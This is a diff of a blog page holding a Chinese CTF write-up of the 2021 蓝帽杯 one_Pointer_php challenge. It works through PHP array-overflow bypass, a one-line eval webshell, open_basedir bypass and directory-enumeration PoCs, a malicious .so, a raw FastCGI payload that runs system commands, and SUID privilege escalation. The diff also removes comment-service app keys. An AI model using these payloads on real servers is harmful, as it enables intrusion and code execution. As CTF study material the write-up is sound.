 <pre class="line-numbers language-none"><code class="language-none">key 为可选项。如果未指定，PHP 将自动使用之前用过的最大 integer 键名加上 1 作为新的键名。
 如果给出方括号但没有指定键名，则取当前最大 int 索引值，新的键名将是该值加上 1（但是最小为 0）。如果当前还没有 int 索引，则键名将为 0 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>进行一个简单测试，如下图可以看到键值在逐渐自增，那这样的话就很容易联系到PHP数组溢出了</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231224152822056.png" alt="image-20231224152822056"></p>
+<p><img src="image-20231224152822056.png" alt="image-20231224152822056"></p>
 <p>在上述文章中也说到：</p>
 <pre class="line-numbers language-none"><code class="language-none">我们可以看到当key值比较小是没有问题，当key值很大时输出的值溢出了，临界点是9223372036854775807这个数字。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>也就是大于这个临界点的话，就会报错，我们再简单测试一番，如下图可以看到此时爆出警告，且最终打印出来的为NULL，这意味着我们可以绕过了</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231224153305372.png" alt="image-20231224153305372"></p>
+<p><img src="image-20231224153305372.png" alt="image-20231224153305372"></p>
 <p>但由于下图中这一步的自增，我们需要给count赋值为临界点-1</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231224154529068.png" alt="image-20231224154529068"></p>
+<p><img src="image-20231224154529068.png" alt="image-20231224154529068"></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span>
 <span class="token punctuation">{</span>
@@ -1246,15 +1251,15 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
 <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pop</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>将得到的数值传给cookie的data，同时backdoor读取phpinfo</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231224154802125.png" alt="image-20231224154802125"></p>
+<p><img src="image-20231224154802125.png" alt="image-20231224154802125"></p>
 <p>如上图，成功绕过，且我们也看到了熟悉的FastCGI服务，不过我们还是跟着做题思路走，毕竟我们这是事后诸葛亮。那这里我们成功绕过，之后肯定想着利用eval进行命令执行，但在此之前我们需要得知其禁用了哪些函数</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231224155044043.png" alt="image-20231224155044043"></p>
+<p><img src="image-20231224155044043.png" alt="image-20231224155044043"></p>
 <p>可以看到你用的很多，但是可以发现没有禁用<code>file_get_content/put</code>等文件读取函数这说明我们可以尝试用put进行木马写入</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?backdoor=file_put_content('shell.php', '<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里面我写入之后也页面测试的好好的，但蚁剑就是死活连不上，结果浪费了两个小时，发现tm又是校园网的原因。。。。。。。。真搞心态！最后换了热点发现成功，随后看了根目录等等，但都发现文件里面没有东西</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231224170441205.png" alt="image-20231224170441205"></p>
+<p><img src="image-20231224170441205.png" alt="image-20231224170441205"></p>
 <p>那我们在研究一下是否phpinfo漏掉了什么东西，如下图这里面含有open_basedir，简单了解一下该函数的作用</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231224170713557.png" alt="image-20231224170713557"></p>
+<p><img src="image-20231224170713557.png" alt="image-20231224170713557"></p>
 <p>在p神的总结下，那就是：open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件的读、写的函数都会经过它的检查，Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。–也就是对应这道题，我们只能读写/var/www/html目录中的文件。</p>
 <pre class="line-numbers language-none"><code class="language-none">设置open_basedir的方法，在linux下，不同的目录由“:”分割，如“/var/www/:/tmp/”；在Windows下不同目录由“;”分割，如“c:/www;c:/windows/temp”。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里p神也说了绕过open_basedir之后几乎是用来进行目录的列举与遍历，而并非具体的文件读写，因为在php5.3以后很少有能够绕过open_basedir读写文件的方法。懒得再开文章了，索性就在这里持续学习了。这里我们根据p神的文章来学习一波如何绕过open_basedir。</p>
@@ -1290,7 +1295,7 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里跟着GPT学习一波上述代码的逻辑，这里懒得配环境了，就直接借用p神的了~~~</p>
 <p>执行我们可以发现，open_basedir为/usr/share/nginx/www/:/tmp/，但我们成功列举了/根目录下的所有文件：</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231224173005894.png" alt="image-20231224173005894"></p>
+<p><img src="image-20231224173005894.png" alt="image-20231224173005894"></p>
 <p>不过这里的测试是在linux环境下才可以的，并且还有一个缺点就是要求php版本为5.3以上，但p神又说5.5/5.6可能有修复，但还没看到。。。这里先不管了</p>
 <h4 id="realpath列举目录">realpath列举目录</h4>
 <p>这个realpath函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的…/或./等跳转字符，能将相对路径转换成绝对路径。</p>
@@ -1299,7 +1304,7 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
 <p>但缺点就是效率太低，上千万次才可以跑完，这肯定不行的，但p神这时候就想到了windows下的通配符：<code>&lt;、&gt;</code></p>
 <p>这里就懵逼了，windows下通配符不是?、*吗，这两个符号是什么鬼，随后看到评论区p神让我们看看这个漏洞</p>
 <p><code>wooyun-2014-071540</code></p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231224175128221.png" alt="image-20231224175128221"></p>
+<p><img src="image-20231224175128221.png" alt="image-20231224175128221"></p>
 <p>上述标记处他打错了，这里说在php+windows+iis环境下这两个符号可以等价于通配符，嗷吼，怪不得，payload如下</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取php.ini中的open_basedir信息</span>
@@ -1322,7 +1327,7 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
 <span class="token punctuation">}</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>执行可以看到：</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225162557238.png" alt="image-20231225162557238"></p>
+<p><img src="image-20231225162557238.png" alt="image-20231225162557238"></p>
 <p>Open_basedir为<code>c:\wamp\www</code>，但我们列举出了d:/test/目录下的文件，不过只能列举出首字母不同的文件，首字母相同的话，就需要添加第二个字符再接着枚举、第三个字符etc…</p>
 <p>这个方法好处是windows下php所有版本通用，当然坏处就是只有windows下才能使用通配符，如果是linux下就只能暴力猜解了。</p>
 <h4 id="SplFileInfo-getRealPath列举目录">SplFileInfo::getRealPath列举目录</h4>
@@ -1348,7 +1353,7 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里附上对<code>ob_flush()</code>与<code>flush()</code>的解释：</p>
 <pre class="line-numbers language-none"><code class="language-none">这个 dump 函数可能主要用于调试目的，当开发者想要得到实时输出并即时观察脚本执行信息时。在脚本执行期间，输出通常会缓存起来，直到达到一定量或脚本执行完毕后一次性发送到浏览器。通过使用 ob_flush() 和 flush()，开发者可以强制立即输出数据，这对于监视长时间运行的脚本非常有用。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225164606189.png" alt="image-20231225164606189"></p>
+<p><img src="image-20231225164606189.png" alt="image-20231225164606189"></p>
 <p>同样可以列举，这个方法有个特点，不管是否开启open_basedir都是可以枚举任意目录的。而上一个方法（realpath）只有在开启open_basedir且在open_basedir外的时候才会报错，才能列举目录。当然，没有开启open_basedir的时候也不需要这样列举目录了。</p>
 <h4 id="GD库imageftbbox-imagefttext列举目录">GD库imageftbbox/imagefttext列举目录</h4>
 <p>GD库一般是PHP必备的拓展库之一，这里我们看p神的分析：</p>
@@ -1375,20 +1380,20 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225165108003.png" alt="image-20231225165108003"></p>
+<p><img src="image-20231225165108003.png" alt="image-20231225165108003"></p>
 <p>我们可以看到成功爆出，但却只能爆出一个字符，但注意的是这里的特殊通配符是起了作用的，只不过在最终输出的时候通配符并没有转换为相应的字符。因此这种方法比realpath麻烦的点在于，需要一位一位爆破。</p>
 <h4 id="bindtextdomain暴力猜解目录">bindtextdomain暴力猜解目录</h4>
 <p>先看p神的分析：</p>
 <p>bindtextdomain是php下绑定domain到某个目录的函数。具体这个domain是什么我也没具体用过，只是在一些l10n应用中可能用到的方法（相关函数textdomain、gettext、setlocale，说明：<a target="_blank" rel="noopener" href="http://php.net/manual/en/function.gettext.php%EF%BC%89">http://php.net/manual/en/function.gettext.php）</a></p>
 <p>Bindtextdomain函数在环境支持Gettext Functions的时候才能使用，而我的windows环境下是没有bindtextdomain函数的，我的linux环境是默认存在这个函数。</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225165416777.png" alt="image-20231225165416777"></p>
+<p><img src="image-20231225165416777.png" alt="image-20231225165416777"></p>
 <p>这个函数的特点在于第二个参数directory，如果文件路径存在则返回具体的路径，不存在则返回false，poc如下</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;'</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token function">bindtextdomain</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225165504916.png" alt="image-20231225165504916"></p>
+<p><img src="image-20231225165504916.png" alt="image-20231225165504916"></p>
 <p>这里可以看到依旧可以绕过open_basedir，缺点在于只能在linux环境下才可以，但在linux下又不能使用通配符来猜解目录，所以这是一个没有办法的办法。。。。</p>
 <p>这里附上<code>linux下又不能使用通配符来猜解目录</code>的原因：</p>
 <pre class="line-numbers language-none"><code class="language-none">在Linux系统中，通过正常的shell环境中使用通配符（如 * 和 ?）来进行文件匹配和简单的模式匹配通常是可行的。然而，通配符通常不用于“猜解”（或称枚举）目录，因为shell通配符的匹配规则并不支持猜解目录结构中未知的部分。
@@ -1396,19 +1401,19 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
 例如，* 可用于匹配任意数量的字符，而 ? 可匹配任意单个字符。这些通配符可以匹配已知模式的文件和目录名称，但它们无法用来发现系统上未知或隐藏的目录。也就是说，你不能通过它们来猜解由未知字符组成的目录名称。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?backdoor=file_put_contents('basedir.php', '<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">printf</span><span class="token punctuation">(</span>\<span class="token string single-quoted-string">'&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;\', ini_get(\'open_basedir\'));$file_list = array();$it = new DirectoryIterator("glob:///*");foreach ($it as $f) {$file_list[] = $f-&gt;__toString();}$it = new DirectoryIterator("glob:///.*");foreach($it as $f) {$file_list[] = $f-&gt;__toString();}sort($file_list);foreach ($file_list as $f) {echo "{$f}&lt;br/&gt;";}?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里我们可以通过p神的第一个glob协议的办法来绕过，这里我是在靶机页面传入的poc有点麻烦还需要注意符号的转义，大家可以蚁剑连接在html下写入文件即可，因此html下是可以进行读写的。</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225172001755.png" alt="image-20231225172001755"></p>
+<p><img src="image-20231225172001755.png" alt="image-20231225172001755"></p>
 <p>如上图看到了根目录下存在flag，那接下来就是读取了，但我们如何绕过disable_functions呢，又是一个没学过的姿势。。。。发现这个题目没学过的知识还是很多的，我依旧需要另起文章去学习，那接下来我们先复现完整这个题目再说，有点走远了。。。。</p>
 <p>总的来说我们想要读取文件的话，就是需要对open_basedir进行修改，但如何修改呢，这里我直接上payload，原理会在其他文章学一下（不过看了看原理，是PHP底层的。。。）</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sub'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sub'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>通过如上payload我们可以重新设置open_basedir对其进行覆盖</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225175452315.png" alt="image-20231225175452315"></p>
+<p><img src="image-20231225175452315.png" alt="image-20231225175452315"></p>
 <p>如图可以列举出目录，接下来依旧是读取，那就是file_get_contents函数了，但我们已经测试过这是行不通的，看了wp说是这里是权限不够，需要提权，但如何提权呢（我也不知道~~~），这里师傅们说可以通过加载恶意so文件，但如何加载呢，这里就需要回到最初我们看到的FastCGI了，既然开启了FastCGI那我们就可以通过开启恶意ftp服务，让靶机来访问我们的服务，最终将恶意so文件上传到靶机。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sub'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sub'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/usr/local/etc/php/php.ini'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225180749023.png" alt="image-20231225180749023"></p>
+<p><img src="image-20231225180749023.png" alt="image-20231225180749023"></p>
 <p>如上图这里应该是说明可以进行加载.so文件，那我们可以构造恶意的.so文件进去，接下来就是读取关于FastCGI服务的一些配置信息了<code>/etc/nginx</code></p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225184353340.png" alt="image-20231225184353340"></p>
+<p><img src="image-20231225184353340.png" alt="image-20231225184353340"></p>
 <p>读取nginx.conf，发现如下两个可以路径，我们先看看sites</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225184717186.png" alt="image-20231225184717186"></p>
+<p><img src="image-20231225184717186.png" alt="image-20231225184717186"></p>
 <p>成功在<code>/etc/nginx/sites-enabled/default</code>读取到详细信息</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server <span class="token punctuation">{</span>
 	listen <span class="token number">80</span> default_server<span class="token punctuation">;</span>
@@ -1473,9 +1478,9 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>通过 shared 命令编译：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc hpdoger.c <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-shared</span> <span class="token parameter variable">-o</span> hpdoger.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225185439729.png" alt="image-20231225185439729"></p>
+<p><img src="image-20231225185439729.png" alt="image-20231225185439729"></p>
 <p>之后上传到靶机的html目录下即可</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225192000039.png" alt="image-20231225192000039"></p>
+<p><img src="image-20231225192000039.png" alt="image-20231225192000039"></p>
 <p>这里使用的wget下载</p>
 <h3 id="构造FastCGI请求PHP-CGI">构造FastCGI请求PHP-CGI</h3>
 <p>这里用gopherus的话还需要修改很多东西，因此直接修改exp了：<a target="_blank" rel="noopener" href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php">fcgi_jailbreak.php</a></p>
@@ -1833,7 +1838,7 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
 <li>通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = "open_basedir = /";</code></li>
 <li>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</li>
 </ul>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225190650328.png" alt="image-20231225190650328"></p>
+<p><img src="image-20231225190650328.png" alt="image-20231225190650328"></p>
 <p>编译得到payload</p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http">data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02H%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fww
 w%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.p
@@ -1876,20 +1881,20 @@ www%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand
 0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERV
 ER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>将上述内容发送后即可成功反弹shell</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225194611177.png" alt="image-20231225194611177"></p>
+<p><img src="image-20231225194611177.png" alt="image-20231225194611177"></p>
 <p>读取的时候发现权限不够，这里需要提权，至于原理一会儿讨论</p>
 <p>利用suid提权方式，查看具有suid权限的文件，这个要等一会才能出来。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225195000795.png" alt="image-20231225195000795"></p>
+<p><img src="image-20231225195000795.png" alt="image-20231225195000795"></p>
 <p>这里看到有PHP权限，直接php -a进入交互模式读取，但这里如果直接读取flag的话还是有open_basedir的限制，因此还需要利用上述的方法绕过，这里写文件比较方便，但我就直接输入了。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225195222662.png" alt="image-20231225195222662"></p>
+<p><img src="image-20231225195222662.png" alt="image-20231225195222662"></p>
 <h3 id="蚁剑插件绕过">蚁剑插件绕过</h3>
 <p>这里看到有个wp说利用蚁剑的插件可以直接梭哈了，学一波，大概就是修改一下蚁剑的插件，省去vps打脚本的过程。蚁剑里有通过攻击 PHP-FPM 绕过 Disable_Functions 的插件，自行去商店下载即可</p>
 <p>但是这里需要对插件进行修改</p>
 <p>插件中的payload使用了<code>fsockopen()</code>，但是<code>fsockopen()</code>被ban了，并且并且蚁剑的插件中没有 PHP-FPM 地址为 127.0.0.1:9001 的选项。但是<code>pfsockopen()</code>没有被ban 而且两者没有任何区别，将这两个文件下的<code>fsockopen()</code>改成<code>pfsockopen()</code></p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225195908301.png" alt="image-20231225195908301"></p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231225200332915.png" alt="image-20231225200332915"></p>
+<p><img src="image-20231225195908301.png" alt="image-20231225195908301"></p>
+<p><img src="image-20231225200332915.png" alt="image-20231225200332915"></p>
 <p>但是没玩懂，跟着做也不行，感兴趣的自己参考文章吧：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-267517.htm">[2021 蓝帽杯]one_Pointer_php 复现</a></p>
 <h1>0x05 总结</h1>
 <p>这里在回顾整理上述攻击的思路：首先就是对于PHP数组的溢出绕过，之后发现可以写木马了，蚁剑连接发现权限不够，因此要想着拿shell，去进一步的提权，接着发现了open_basedir的限制以及FastCGI服务开启了。</p>
@@ -2005,7 +2010,7 @@ ER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOC
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -2013,7 +2018,7 @@ ER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOC
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -2293,12 +2298,12 @@ ER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOC
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
